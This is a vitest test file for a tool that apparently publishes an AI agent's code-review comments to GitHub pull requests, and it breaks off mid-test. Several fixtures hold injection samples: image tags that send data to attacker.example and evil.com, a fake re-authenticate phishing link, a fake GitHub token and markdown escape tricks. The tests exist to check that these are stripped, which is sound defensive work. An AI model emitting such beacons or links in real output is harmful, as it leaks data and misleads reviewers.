import { execFileSync } from "node:child_process";
import { describe, expect, it } from "vitest";
import type { PrContext, PrFile } from "../src/common/context.js";
import { parseUnifiedDiff, type FileDiff } from "../src/common/diff.js";
import type { Draft, DraftComment } from "../src/common/draft.js";
import { parsePolicy, resolvePolicy } from "../src/policy/load.js";
import type { ResolvedPolicy } from "../src/policy/schema.js";
import {
  createGitHubApi,
  foldCommentsIntoBody,
  isEventRefusedError,
  isLineResolutionError,
  runExternalId,
  runIdFromExternalId,
  type RunRef,
} from "../src/publish/github.js";
import {
  buildPlan,
  commentKey,
  commentMarker,
  extractCommentKeys,
  isXrepoReviewBody,
  REVIEW_MARKER,
  runStatusStickyBody,
  STICKY_MARKER,
  stickyCommentBody,
  stickySummaryLimit,
  type BuildPlanInput,
  type PlanReview,
} from "../src/publish/plan.js";
import { summaryBudget } from "../src/review/rules.js";
import { composeSticky, renderOutcomeComment } from "../src/publish/publish.js";

const Z = "\u200B";

/* -------------------------------- fixtures -------------------------------- */

const DIFF = [
  "diff --git a/src/orders.ts b/src/orders.ts",
  "index 1111111..2222222 100644",
  "--- a/src/orders.ts",
  "+++ b/src/orders.ts",
  "@@ -10,6 +10,8 @@ export function createOrder() {",
  " const a = 1;",
  " const b = 2;",
  " const c = 3;",
  "+const d = 4;",
  "+const e = 5;",
  " const f = 6;",
  " const g = 7;",
  " const h = 8;",
  "@@ -40,3 +42,4 @@ export function cancelOrder() {",
  " return a;",
  "+// added",
  " return c;",
  " }",
  "diff --git a/src/new.ts b/src/new.ts",
  "new file mode 100644",
  "index 0000000..3333333",
  "--- /dev/null",
  "+++ b/src/new.ts",
  "@@ -0,0 +1,3 @@",
  "+one",
  "+two",
  "+three",
  "diff --git a/old.txt b/old.txt",
  "deleted file mode 100644",
  "index 4444444..0000000",
  "--- a/old.txt",
  "+++ /dev/null",
  "@@ -1,2 +0,0 @@",
  "-x",
  "-y",
  "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml",
  "index 5555555..6666666 100644",
  "--- a/.github/workflows/ci.yml",
  "+++ b/.github/workflows/ci.yml",
  "@@ -1,2 +1,2 @@",
  " name: ci",
  "-on: push",
  "+on: [push, pull_request]",
  "diff --git a/img.png b/img.png",
  "index 7777777..8888888 100644",
  "Binary files a/img.png and b/img.png differ",
  "diff --git a/docs/gen.md b/docs/gen.md",
  "index 9999999..aaaaaaa 100644",
  "--- a/docs/gen.md",
  "+++ b/docs/gen.md",
  "@@ -1 +1 @@",
  "-old",
  "+new",
  "",
].join("\n");

const FULL_DIFF: FileDiff[] = parseUnifiedDiff(DIFF);
/** Same PR without the workflow file and the ignored doc (so approval rules can pass). */
const SMALL_DIFF: FileDiff[] = FULL_DIFF.filter((f) => ["src/orders.ts", "src/new.ts"].includes(f.path));

function filesOf(diff: FileDiff[], ignored: string[]): PrFile[] {
  return diff
    .filter((f) => !ignored.includes(f.path))
    .map((f) => ({ path: f.path, status: f.status, additions: f.additions, deletions: f.deletions }));
}

function mkCtx(diff: FileDiff[], ignored: string[] = []): PrContext {
  const files = filesOf(diff, ignored);
  return {
    repo: "acme/api",
    number: 7,
    title: "Add orders",
    body: "",
    author: "dev",
    author_type: "User",
    base_sha: "base",
    head_sha: "head",
    base_ref: "main",
    head_ref: "feature",
    draft: false,
    fork: false,
    html_url: "https://github.com/acme/api/pull/7",
    files,
    changed_lines: files.reduce((n, f) => n + f.additions + f.deletions, 0),
    ignored_files: ignored,
  };
}

const FULL_CTX = mkCtx(FULL_DIFF, ["docs/gen.md"]);
const SMALL_CTX = mkCtx(SMALL_DIFF);

function pol(layer: Record<string, unknown> = {}): ResolvedPolicy {
  return resolvePolicy(parsePolicy(JSON.stringify({ version: 1, defaults: layer })), "acme/api");
}

function cmt(path: string, line: number, severity: DraftComment["severity"], body = `issue at ${path}:${line}`, extra: Partial<DraftComment> = {}): DraftComment {
  return { type: "comment", path, line, body, severity, ...extra };
}

function draft(d: Partial<Draft> = {}): Draft {
  return { comments: [], labels: [], finished: true, invalidLines: 0, ...d };
}

function plan(over: Partial<BuildPlanInput> & { draft?: Draft } = {}) {
  return buildPlan({ policy: pol(), ctx: FULL_CTX, diff: FULL_DIFF, draft: draft(), ...over });
}

/* ------------- rendering checks with a real CommonMark/GFM parser (pandoc, when installed) ------------- */

const HAS_PANDOC = ((): boolean => {
  try {
    execFileSync("pandoc", ["--version"], { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
})();

/** Forbidden output as GitHub would render it (images, non-github links, mentions outside code). */
function expectRendersSafe(md: string, label = ""): void {
  if (!HAS_PANDOC) return;
  const html = execFileSync("pandoc", ["-f", "gfm", "-t", "html", "--no-highlight"], { input: md }).toString();
  const bad: string[] = [];
  if (/<img\b/i.test(html)) bad.push("img");
  for (const m of html.matchAll(/<a [^>]*href="([^"]*)"/g)) {
    if (!/^(?:https?:\/\/(?:[a-z0-9-]+\.)*github\.com(?:[/?#]|$)|[#/])/i.test(m[1] ?? "")) bad.push(`link ${m[1]}`);
  }
  const text = html.replace(/<code[^>]*>[\s\S]*?<\/code>/g, "").replace(/<[^>]*>/g, "");
  if (/(?<![A-Za-z0-9_])@[A-Za-z0-9]/.test(text)) bad.push("mention");
  expect(bad, `${label}\nmarkdown ${JSON.stringify(md)}\nhtml ${html}`).toEqual([]);
}

/* --------------------------------- tests ---------------------------------- */

describe("markers and keys", () => {
  it("computes 12-hex whitespace-insensitive keys and parses markers", () => {
    const k = commentKey("src/a.ts", 3, "Hello   world\n");
    expect(k).toMatch(/^[0-9a-f]{12}$/);
    expect(commentKey("src/a.ts", 3, " Hello world")).toBe(k);
    expect(commentKey("src/a.ts", 4, "Hello world")).not.toBe(k);
    expect(extractCommentKeys(`x ${commentMarker(k)} y ${commentMarker("0123456789ab")}`)).toEqual([k, "0123456789ab"]);
    expect(extractCommentKeys("<!-- xrepo:c:XYZ -->")).toEqual([]);
    expect(stickyCommentBody("hi")).toBe(`${STICKY_MARKER}\nhi`);
  });
});

describe("buildPlan: inline comments", () => {
  it("posts commentable comments on the RIGHT side with a hidden marker", () => {
    const c = cmt("src/orders.ts", 13, "medium", "Possible overflow");
    const p = plan({ draft: draft({ comments: [c] }) });
    expect(p.review?.event).toBe("COMMENT");
    expect(p.review?.comments).toHaveLength(1);
    const pc = p.review!.comments[0]!;
    expect(pc).toMatchObject({ path: "src/orders.ts", line: 13, side: "RIGHT" });
    expect(pc.start_line).toBeUndefined();
    expect(pc.body).toContain("**Medium**");
    expect(pc.body).toContain("Possible overflow");
    expect(pc.body.endsWith(commentMarker(commentKey(c.path, c.line, c.body)))).toBe(true);
    expect(p.findings).toBe(1);
    expect(p.top_severity).toBe("medium");
    expect(p.stats.inline).toBe(1);
  });

  it("sorts by severity, keeping draft order for ties", () => {
    const p = plan({
      draft: draft({
        comments: [
          cmt("src/orders.ts", 10, "low", "first low"),
          cmt("src/orders.ts", 11, "critical", "crit"),
          cmt("src/orders.ts", 12, "low", "second low"),
          cmt("src/new.ts", 1, "high", "high one"),
        ],
      }),
    });
    expect(p.review!.comments.map((c) => c.line)).toEqual([11, 1, 10, 12]);
    expect(p.top_severity).toBe("critical");
  });

  it("maps multi-line ranges to start_line/line and demotes ranges crossing hunks", () => {
    const p = plan({
      draft: draft({
        comments: [cmt("src/orders.ts", 12, "medium", "range", { end_line: 15 }), cmt("src/orders.ts", 16, "medium", "cross", { end_line: 43 })],
      }),
    });
    expect(p.review!.comments).toHaveLength(1);
    expect(p.review!.comments[0]).toMatchObject({ start_line: 12, start_side: "RIGHT", line: 15, side: "RIGHT" });
    expect(p.summary).toContain("Notes outside the diff (1)");
    expect(p.summary).toContain("`src/orders.ts:16-43`");
  });

  it("demotes non-commentable comments to 'Notes outside the diff'", () => {
    const p = plan({
      draft: draft({
        comments: [
          cmt("src/orders.ts", 30, "high", "outside hunk"),
          cmt("src/unknown.ts", 1, "high", "not changed"),
          cmt("old.txt", 1, "medium", "deleted"),
          cmt("img.png", 1, "medium", "binary"),
          cmt("docs/gen.md", 1, "medium", "ignored"),
        ],
      }),
    });
    expect(p.review).toBeUndefined();
    expect(p.stats.demoted).toBe(5);
    expect(p.findings).toBe(5);
    expect(p.summary).toContain("Notes outside the diff (5)");
    for (const why of ["outside hunk", "not changed", "deleted", "binary", "ignored"]) expect(p.summary).toContain(why);
    expect(p.decisions.join("\n")).toContain("file excluded from the review (triggers.ignore_paths)");
  });

  it("drops comments below min_severity but counts them as findings", () => {
    const p = plan({
      policy: pol({ capabilities: { inline_comments: { min_severity: "medium" } } }),
      draft: draft({ comments: [cmt("src/orders.ts", 13, "low", "nit"), cmt("src/orders.ts", 14, "high", "bug")] }),
    });
    expect(p.review!.comments.map((c) => c.line)).toEqual([14]);
    expect(p.stats.below_min_severity).toBe(1);
    expect(p.findings).toBe(2);
    expect(p.summary).not.toContain("nit");
  });

  it("dedupes within the draft and skips comments already posted", () => {
    const a = cmt("src/orders.ts", 13, "medium", "Same  text");
    const b = cmt("src/orders.ts", 13, "high", "Same text\n");
    const posted = cmt("src/orders.ts", 14, "medium", "old one");
    const p = plan({
      draft: draft({ comments: [a, b, posted] }),
      existingCommentKeys: new Set([commentKey(posted.path, posted.line, posted.body)]),
    });
    expect(p.review!.comments).toHaveLength(1);
    expect(p.review!.comments[0]!.line).toBe(13);
    expect(p.stats.duplicates).toBe(1);
    expect(p.stats.already_posted).toBe(1);
    expect(p.findings).toBe(2);
  });

  it("caps at max_comments and lists the overflow in the summary", () => {
    const p = plan({
      policy: pol({ capabilities: { inline_comments: { max_comments: 2 } } }),
      draft: draft({
        comments: [
          cmt("src/orders.ts", 10, "low", "a-low"),
          cmt("src/orders.ts", 11, "high", "b-high"),
          cmt("src/orders.ts", 12, "medium", "c-medium"),
          cmt("src/orders.ts", 13, "critical", "d-critical"),
        ],
      }),
    });
    expect(p.review!.comments.map((c) => c.line)).toEqual([13, 11]);
    expect(p.stats.over_cap).toBe(2);
    expect(p.summary).toContain("More findings (inline comment limit reached) (2)");
    expect(p.summary.indexOf("c-medium")).toBeLessThan(p.summary.indexOf("a-low"));
  });

  it("truncates bodies to max_comment_chars (marker and severity header excluded)", () => {
    const p = plan({
      policy: pol({ capabilities: { inline_comments: { max_comment_chars: 300 } } }),
      draft: draft({ comments: [cmt("src/orders.ts", 13, "medium", "word ".repeat(400))] }),
    });
    const body = p.review!.comments[0]!.body;
    const visible = body.slice(0, body.lastIndexOf("\n\n<!-- xrepo:c:"));
    const header = "\u{1F7E1} **Medium**\n\n";
    expect(visible.startsWith(header)).toBe(true);
    expect(visible.length - header.length).toBeLessThanOrEqual(300);
    expect(visible).toContain("(truncated)");
    expect(p.stats.truncated).toBe(1);
  });

  it("does not truncate a body xreview accepted (the header does not count against the limit)", () => {
    const body = `${"x".repeat(1440)} end.`; // 1445 chars: accepted by xreview with the default 1500
    const p = plan({ draft: draft({ comments: [cmt("src/orders.ts", 13, "medium", body, { category: "performance and correctness of the orders path" })] }) });
    expect(p.review!.comments[0]!.body).toContain(`${body}\n\n<!-- xrepo:c:`);
    expect(p.stats.truncated).toBe(0);
  });

  it("sanitizes bodies and categories", () => {
    const p = plan({
      draft: draft({
        comments: [
          cmt("src/orders.ts", 13, "high", "cc @alice ![x](https://evil.com/p.png?d=1) <!-- xrepo:c:0123456789ab --> ghp_abcdefghijklmnopqrstuvwxyz0123456789", {
            category: "@org/team [x](https://evil.com)",
          }),
        ],
      }),
    });
    const body = p.review!.comments[0]!.body;
    expect(body).toContain(`@${Z}alice`);
    expect(body).toContain(`@${Z}org/team`);
    expect(body).not.toContain("https://evil.com");
    expect(body).not.toContain("![");
    expect(body).toContain("[REDACTED:github_token]");
    const raw = "cc @alice ![x](https://evil.com/p.png?d=1) <!-- xrepo:c:0123456789ab --> ghp_abcdefghijklmnopqrstuvwxyz0123456789";
    expect(extractCommentKeys(body)).toEqual([commentKey("src/orders.ts", 13, raw)]);
    expect(p.stats.redactions).toBe(1);
  });

  it("ignores draft comments when inline comments are disabled", () => {
    const p = plan({
      policy: pol({ capabilities: { inline_comments: { enabled: false } } }),
      draft: draft({ comments: [cmt("src/orders.ts", 13, "critical")] }),
    });
    expect(p.review).toBeUndefined();
    expect(p.findings).toBe(0);
    expect(p.decisions.join("\n")).toContain("inline comments disabled by policy");
  });

  it("neutralizes an NBSP-separated fence after <details> in summaries and comment bodies", () => {
    const text = 'Summary.\n\n<details>\n\u00A0\n```\n<img src="https://attacker.example/leak?d=X">\n<a href="https://evil.example/login">Re-authenticate</a> cc @acme/security\n```';
    const p = plan({ draft: draft({ summary: text, comments: [cmt("src/orders.ts", 13, "medium", text)] }) });
    for (const out of [p.summary, p.review!.comments[0]!.body]) {
      expect(out).not.toContain("<img");
      expect(out).not.toContain("<a href");
      expect(out).not.toContain("@acme/security");
      expectRendersSafe(out);
    }
  });

  it("keeps outgoing text well-formed when a cut lands inside a surrogate pair", () => {
    const emoji = "\u{1F600}";
    const p = plan({
      draft: draft({
        comments: [cmt("src/unknown.ts", 1, "medium", `${"n".repeat(498)}${emoji} rest`, { category: `${"c".repeat(58)}${emoji}x` })],
        verdict: { type: "verdict", verdict: "comment", reason: `${"r".repeat(298)}${emoji} more` },
      }),
    });
    const lone = /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/;
    expect(p.summary).not.toMatch(lone);
    expect(p.summary).toContain(`${"n".repeat(498)}\u2026`);
    expect(p.summary).toContain(`${"r".repeat(298)}\u2026`);
    const q = plan({ draft: draft({ comments: [cmt("src/orders.ts", 13, "medium", "x", { category: `${"c".repeat(58)}${emoji}x` })] }) });
    expect(q.review!.comments[0]!.body).not.toMatch(lone);
  });
});

describe("buildPlan: suggestions", () => {
  const withSuggestion = (suggestion: string, extra: Partial<DraftComment> = {}) =>
    draft({ comments: [cmt("src/orders.ts", 13, "medium", "use a constant", { suggestion, ...extra })] });

  it("appends a ```suggestion block when allowed", () => {
    const p = plan({ draft: withSuggestion("const d = FOUR;\n") });
    const body = p.review!.comments[0]!.body;
    expect(body).toContain("\n\n```suggestion\nconst d = FOUR;\n```\n\n<!-- xrepo:c:");
    expect(p.stats.suggestions).toBe(1);
  });

  it("keeps suggestion code byte-exact (no mention/URL neutralization)", () => {
    const code = "  @Override // see https://evil.com/x and <T>";
    const body = plan({ draft: withSuggestion(code) }).review!.comments[0]!.body;
    expect(body).toContain(`\`\`\`suggestion\n${code}\n\`\`\``);
  });

  it("emits an empty block (delete lines) for an empty suggestion", () => {
    const body = plan({ draft: withSuggestion("") }).review!.comments[0]!.body;
    expect(body).toContain("\n\n```suggestion\n```\n\n<!-- xrepo:c:");
  });

  it("drops suggestions when disabled and neutralizes body-embedded ones", () => {
    const p = plan({
      policy: pol({ capabilities: { inline_comments: { suggestions: false } } }),
      draft: draft({
        comments: [cmt("src/orders.ts", 13, "medium", "fix:\n\n```suggestion\nx\n```", { suggestion: "const d = 5;" })],
      }),
    });
    const body = p.review!.comments[0]!.body;
    expect(body).not.toContain("```suggestion");
    expect(body).toContain("```text\nx\n```");
    expect(p.stats.suggestions_dropped).toBe(1);
  });

  it("drops unsafe suggestions but keeps the comment", () => {
    for (const s of ["a\n```\n![x](https://evil.com)", "a\n   ````", "key = ghp_abcdefghijklmnopqrstuvwxyz0123456789", "x \u202E y"]) {
      const p = plan({ draft: withSuggestion(s) });
      const body = p.review!.comments[0]!.body;
      expect(body, s).not.toContain("```suggestion");
      expect(body).toContain("use a constant");
      expect(p.stats.suggestions_dropped).toBe(1);
    }
  });

  it("keeps the appended suggestion a suggestion when the body leaves a <pre> open", () => {
    const evil = '<img src="https://attacker.example/p.png?leak=DATA"> <a href="https://evil.example/login">sign in again</a>';
    for (const tail of ["<pre>", "<PRE>", "<pre><code>", "<pre lang=ts>"]) {
      const p = plan({ draft: withSuggestion(evil, { body: `Consider this change:\n${tail}` }) });
      const body = p.review!.comments[0]!.body;
      // The suggestion itself stays byte-exact; the body before it no longer opens a <pre> block.
      expect(body, tail).toContain(`\n\n\`\`\`suggestion\n${evil}\n\`\`\`\n\n<!-- xrepo:c:`);
      expect(body.slice(0, body.indexOf("```suggestion")), tail).not.toMatch(/^ {0,3}<pre/im);
      expectRendersSafe(body, tail);
    }
  });

  it("never truncates a ```suggestion written in the body (dropped instead)", () => {
    const code = Array.from({ length: 80 }, (_, i) => `  const value${i} = compute(${i});`).join("\n");
    const p = plan({ draft: draft({ comments: [cmt("src/orders.ts", 13, "medium", `Use this:\n\n\`\`\`suggestion\n${code}\n\`\`\``)] }) });
    const body = p.review!.comments[0]!.body;
    expect(body).not.toContain("```suggestion");
    expect(body).toContain("(truncated)");
    // One that fits (xreview's limit: body <= max_comment_chars) is posted whole.
    const small = Array.from({ length: 6 }, (_, i) => `  const v${i} = f(${i}); // keep`).join("\n");
    const fit = `${"Explanation. ".repeat(11)}\n\n\`\`\`suggestion\n${small}\n\`\`\``;
    const p2 = plan({
      policy: pol({ capabilities: { inline_comments: { max_comment_chars: fit.length } } }),
      draft: draft({ comments: [cmt("src/orders.ts", 13, "medium", fit, { category: "performance" })] }),
    });
    expect(p2.review!.comments[0]!.body).toContain(`\`\`\`suggestion\n${small}\n\`\`\``);
    expect(p2.stats.truncated).toBe(0);
  });

  it("drops (never truncates) a suggestion that does not fit", () => {
    const p = plan({
      policy: pol({ capabilities: { inline_comments: { max_comment_chars: 200 } } }),
      draft: withSuggestion("x".repeat(500)),
    });
    expect(p.review!.comments[0]!.body).not.toContain("```suggestion");
    expect(p.decisions.join("\n")).toContain("does not fit max_comment_chars");
  });
});

describe("buildPlan: verdict", () => {
  const approvePolicy = (extra: Record<string, unknown> = {}) =>
    pol({ capabilities: { approve: { enabled: true, ...extra }, check: { enabled: true } } });
  const approveDraft = (comments: DraftComment[] = []) =>
    draft({ comments, verdict: { type: "verdict", verdict: "approve", reason: "looks good" } });

  it("approves when every rule passes", () => {
    const p = buildPlan({ policy: approvePolicy(), ctx: SMALL_CTX, diff: SMALL_DIFF, draft: approveDraft([cmt("src/new.ts", 2, "low", "nit")]) });
    expect(p.verdict).toBe("approve");
    expect(p.approved).toBe(true);
    expect(p.blocked).toBe(false);
    expect(p.review?.event).toBe("APPROVE");
    expect(p.check).toMatchObject({ name: "xrepo-review", conclusion: "success", title: "Approved" });
    expect(p.summary).toContain("Verdict: **approve**");
    expect(p.summary).toContain("looks good");
  });

  it("approves with no findings and no comments (review still posted)", () => {
    const p = buildPlan({ policy: approvePolicy(), ctx: SMALL_CTX, diff: SMALL_DIFF, draft: approveDraft() });
    expect(p.review).toMatchObject({ event: "APPROVE", comments: [] });
  });

  it("downgrades approve with a reason for each failed rule", () => {
    const cases: [string, Partial<BuildPlanInput>, string][] = [
      ["disabled", { policy: pol({ capabilities: { approve: { enabled: false } } }) }, "approving is disabled by policy"],
      ["severity (demoted finding counts)", { draft: approveDraft([cmt("src/unknown.ts", 1, "medium", "elsewhere")]) }, '1 finding above "low"'],
      ["never_paths", { ctx: FULL_CTX, diff: FULL_DIFF }, "approve.never_paths"],
      ["size", { policy: approvePolicy({ max_changed_lines: 3 }) }, "6 changed lines exceed approve.max_changed_lines (3)"],
    ];
    for (const [name, over, reason] of cases) {
      const p = buildPlan({ policy: approvePolicy(), ctx: SMALL_CTX, diff: SMALL_DIFF, draft: approveDraft(), ...over });
      expect(p.verdict, name).toBe("comment");
      expect(p.requested_verdict).toBe("approve");
      expect(p.approved).toBe(false);
      expect(p.review?.event ?? "COMMENT").toBe("COMMENT");
      expect(p.summary, name).toContain("Approval downgraded to a comment");
      expect(p.summary, name).toContain(reason);
      expect(p.summary).toContain("(requested: approve)");
    }
  });

  it("names never_paths matches safely (hostile file names are sanitized)", () => {
    const evil = ".github/[x](https:evil.com) @org";
    const d = [...SMALL_DIFF];
    const ctx = { ...SMALL_CTX, files: [...SMALL_CTX.files, { path: evil, status: "added" as const, additions: 1, deletions: 0 }] };
    const p = buildPlan({ policy: approvePolicy(), ctx, diff: d, draft: approveDraft() });
    expect(p.verdict).toBe("comment");
    expect(p.summary).not.toMatch(/(?<![\w])@org/);
    expect(p.summary).not.toContain("](https:evil.com)");
  });

  const blockPolicy = (method: string, check = false) =>
    pol({ capabilities: { block: { enabled: true, method }, check: { enabled: check } } });
  const blockDraft = (sev: DraftComment["severity"] = "high") =>
    draft({ comments: [cmt("src/orders.ts", 13, sev, "sql injection")], verdict: { type: "verdict", verdict: "request_changes", reason: "" } });

  it("blocks with a failing check (method check)", () => {
    const p = plan({ policy: blockPolicy("check"), draft: blockDraft() });
    expect(p.verdict).toBe("request_changes");
    expect(p.blocked).toBe(true);
    expect(p.review?.event).toBe("COMMENT");
    expect(p.check).toMatchObject({ conclusion: "failure" });
    expect(p.check!.title).toContain("Changes requested");
  });

  it("blocks with REQUEST_CHANGES (method review), no check unless enabled", () => {
    const p = plan({ policy: blockPolicy("review"), draft: blockDraft() });
    expect(p.review?.event).toBe("REQUEST_CHANGES");
    expect(p.check).toBeUndefined();
    const p2 = plan({ policy: blockPolicy("review", true), draft: blockDraft() });
    expect(p2.check?.conclusion).toBe("neutral");
  });

  it("blocks both ways (method both)", () => {
    const p = plan({ policy: blockPolicy("both"), draft: blockDraft() });
    expect(p.review?.event).toBe("REQUEST_CHANGES");
    expect(p.check?.conclusion).toBe("failure");
  });

  it("downgrades request_changes when blocking is disabled or no finding is severe enough", () => {
    const p = plan({ draft: blockDraft() });
    expect(p.verdict).toBe("comment");
    expect(p.summary).toContain("blocking is disabled by policy");
    const p2 = plan({ policy: blockPolicy("both"), draft: blockDraft("medium") });
    expect(p2.verdict).toBe("comment");
    expect(p2.blocked).toBe(false);
    expect(p2.summary).toContain('no finding at or above "high"');
    expect(p2.check?.conclusion).toBe("neutral");
  });

  it("explains that blocking cannot apply when inline comments are disabled, and does not report 'No findings'", () => {
    const p = plan({
      policy: pol({ capabilities: { inline_comments: { enabled: false }, block: { enabled: true, method: "both" }, check: { enabled: true } } }),
      draft: draft({ summary: "CRITICAL: SQL injection in a.ts:2", verdict: { type: "verdict", verdict: "request_changes", reason: "sqli" } }),
    });
    expect(p.verdict).toBe("comment");
    expect(p.blocked).toBe(false);
    expect(p.summary).toContain("inline comments are disabled by policy, so there are no findings to block on");
    expect(p.summary).not.toContain('no finding at or above "high"');
    expect(p.decisions.join("\n")).toContain("block.enabled has no effect: inline comments are disabled");
    expect(p.check).toMatchObject({ conclusion: "neutral", title: "Review completed (inline findings are disabled by policy)" });
    const zero = plan({ policy: pol({ capabilities: { inline_comments: { max_comments: 0 }, check: { enabled: true } } }) });
    expect(zero.check?.conclusion).toBe("neutral");
  });

  it("asks the publisher to dismiss stale change requests unless this run blocks via a review", () => {
    expect(plan({ policy: blockPolicy("review"), draft: blockDraft() }).dismiss_change_requests).toBe(false);
    expect(plan({ policy: blockPolicy("both"), draft: blockDraft() }).dismiss_change_requests).toBe(false);
    const fixed = plan({ policy: blockPolicy("review"), draft: blockDraft("medium") });
    expect(fixed.verdict).toBe("comment");
    expect(fixed.dismiss_change_requests).toBe(true);
    expect(fixed.decisions.join("\n")).toContain("earlier change requests by this reviewer are stale");
    expect(plan({ policy: blockPolicy("check"), draft: blockDraft() }).dismiss_change_requests).toBe(true);
    expect(plan().dismiss_change_requests).toBe(true);
    // An incomplete run neither blocks nor unblocks.
    expect(plan({ policy: blockPolicy("review"), draft: { ...blockDraft("medium"), finished: false } }).dismiss_change_requests).toBe(false);
    expect(plan({ policy: blockPolicy("review"), draft: blockDraft("medium"), incomplete: true }).dismiss_change_requests).toBe(false);
  });

  it("never approves or blocks an incomplete review", () => {
    for (const over of [{ incomplete: true, draft: blockDraft() }, { draft: { ...blockDraft(), finished: false } }]) {
      const p = plan({ policy: blockPolicy("both"), ...over });
      expect(p.verdict).toBe("comment");
      expect(p.blocked).toBe(false);
      expect(p.check?.conclusion).toBe("neutral");
      expect(p.check?.title).toBe("Review incomplete");
      expect(p.summary).toContain("Incomplete review");
      expect(p.summary).toContain("did not finish");
    }
    const a = buildPlan({ policy: approvePolicy(), ctx: SMALL_CTX, diff: SMALL_DIFF, draft: approveDraft(), incomplete: true });
    expect(a.approved).toBe(false);
    expect(a.review).toBeUndefined();
  });

  it("defaults to comment without a verdict", () => {
    const p = plan({ draft: draft({ comments: [cmt("src/orders.ts", 13, "critical")] }) });
    expect(p.verdict).toBe("comment");
    expect(p.requested_verdict).toBe("comment");
  });
});

describe("buildPlan: summary, check, labels", () => {
  it("sticky mode: summary carries body, notes, status and the trusted footer", () => {
    const p = plan({
      policy: pol({ output: { footer: "Questions? ping @acme/devops in [chat](https://chat.example.com)" } }),
      draft: draft({ summary: "Overall OK. <img src=https://evil.com/x>", comments: [cmt("src/orders.ts", 13, "low"), cmt("src/x.ts", 1, "low", "far away")] }),
    });
    expect(p.summaryTarget).toBe("sticky");
    expect(p.summary.startsWith("### ")).toBe(true);
    expect(p.summary).toContain("Overall OK.");
    expect(p.summary).not.toContain("evil.com");
    expect(p.summary).toContain("far away");
    expect(p.summary.endsWith("Questions? ping @acme/devops in [chat](https://chat.example.com)")).toBe(true);
    expect(p.review?.body).toContain("summary comment");
    expect(p.summary).not.toContain(STICKY_MARKER);
  });

  it("review mode: the summary is the review body, even without comments", () => {
    const p = plan({ policy: pol({ capabilities: { summary_comment: { mode: "review" } } }), draft: draft({ summary: "All good" }) });
    expect(p.summaryTarget).toBe("review");
    expect(p.review).toMatchObject({ event: "COMMENT", comments: [] });
    expect(p.review!.body).toBe(`${p.summary}\n\n${REVIEW_MARKER}`);
  });

  it("summary disabled: nothing sticky, downgrade reasons go to the review body", () => {
    const p = plan({
      policy: pol({ capabilities: { summary_comment: { enabled: false } } }),
      draft: draft({ comments: [cmt("src/orders.ts", 13, "high")], verdict: { type: "verdict", verdict: "approve", reason: "" } }),
    });
    expect(p.summaryTarget).toBe("none");
    expect(p.review!.body).toContain("Approval downgraded");
  });

  it("produces a neutral summary when there is nothing to say", () => {
    const p = plan();
    expect(p.review).toBeUndefined();
    expect(p.summaryTarget).toBe("sticky");
    expect(p.summary).toContain("No findings were reported");
    expect(p.findings).toBe(0);
    expect(p.top_severity).toBeUndefined();
    const inc = plan({ draft: draft({ finished: false }) });
    expect(inc.summary).toContain("stopped before reporting any findings");
  });

  it("respects summary_comment.max_chars (the agent's text; title, notes and footers have their own room)", () => {
    const policy = pol({ capabilities: { summary_comment: { max_chars: 1000 } } });
    const p = plan({
      policy,
      draft: draft({ summary: "lorem ipsum ".repeat(500), comments: Array.from({ length: 30 }, (_, i) => cmt("src/x.ts", i + 1, "medium", `note ${i} `.repeat(20))) }),
    });
    const budget = summaryBudget(policy, stickySummaryLimit(policy));
    expect(budget.bodyChars).toBe(1000);
    expect(p.summary.length).toBeLessThanOrEqual(budget.totalChars);
    // The over-long agent text is cut to max_chars; the notes and the footer are still there.
    const body = p.summary.slice(p.summary.indexOf("lorem"), p.summary.indexOf("#### Notes outside the diff"));
    expect(body.trim().length).toBeLessThanOrEqual(1000);
    expect(body).toContain("(truncated)");
    expect(p.summary).toContain("#### Notes outside the diff (30)");
    expect(p.summary).toContain("Verdict: **comment**");
  });

  it("creates a check only when configured", () => {
    expect(plan().check).toBeUndefined();
    expect(plan({ policy: pol({ capabilities: { check: { enabled: true, name: "ai-review" } } }) }).check).toMatchObject({
      name: "ai-review",
      conclusion: "success",
      title: "No findings",
    });
    expect(plan({ policy: pol({ capabilities: { block: { enabled: true, method: "check" } } }) }).check?.conclusion).toBe("success");
    const withFindings = plan({ policy: pol({ capabilities: { check: { enabled: true } } }), draft: draft({ comments: [cmt("src/orders.ts", 13, "medium")] }) });
    expect(withFindings.check).toMatchObject({ conclusion: "neutral", title: "1 finding, top severity medium" });
  });

  it("keeps only allowed labels (case-insensitive, canonical spelling)", () => {
    const p = plan({
      policy: pol({ capabilities: { labels: { enabled: true, allowed: ["Needs-Tests", "security"] } } }),
      draft: draft({ labels: ["needs-tests", "SECURITY", "merge-now", "security"] }),
    });
    expect(p.labels).toEqual(["Needs-Tests", "security"]);
    expect(p.stats.labels_dropped).toBe(1);
    const off = plan({ draft: draft({ labels: ["security"] }) });
    expect(off.labels).toEqual([]);
  });

  it("is deterministic and does not mutate its inputs", () => {
    const d = draft({
      summary: "s",
      comments: [cmt("src/orders.ts", 13, "high", "a", { suggestion: "x" }), cmt("src/x.ts", 2, "low")],
      labels: ["a"],
      verdict: { type: "verdict", verdict: "approve", reason: "r" },
    });
    const policy = pol({ capabilities: { approve: { enabled: true }, check: { enabled: true }, labels: { enabled: true, allowed: ["a"] } } });
    const before = JSON.stringify({ d, policy, FULL_CTX });
    const keys = new Set<string>(["000000000000"]);
    const p1 = buildPlan({ policy, ctx: FULL_CTX, diff: FULL_DIFF, draft: d, existingCommentKeys: keys });
    const p2 = buildPlan({ policy, ctx: FULL_CTX, diff: FULL_DIFF, draft: d, existingCommentKeys: keys });
    expect(p2).toEqual(p1);
    expect(JSON.stringify({ d, policy, FULL_CTX })).toBe(before);
    expect([...keys]).toEqual(["000000000000"]);
  });

  it("records invalid draft lines", () => {
    const p = plan({ draft: draft({ invalidLines: 3 }) });
    expect(p.stats.invalid_draft_lines).toBe(3);
    expect(p.decisions[0]).toContain("3 invalid lines");
  });
});

describe("buildPlan: round-2 regressions", () => {
  const approvePolicy = (extra: Record<string, unknown> = {}) =>
    pol({ capabilities: { approve: { enabled: true, ...extra }, check: { enabled: true } } });
  const approveDraft = (comments: DraftComment[] = []) =>
    draft({ comments, verdict: { type: "verdict", verdict: "approve", reason: "looks good" } });

  // dismisses-other-tools-change-requests
  it("ends every review body with the hidden review marker (after sanitizing; the agent cannot forge it)", () => {
    const cases = [
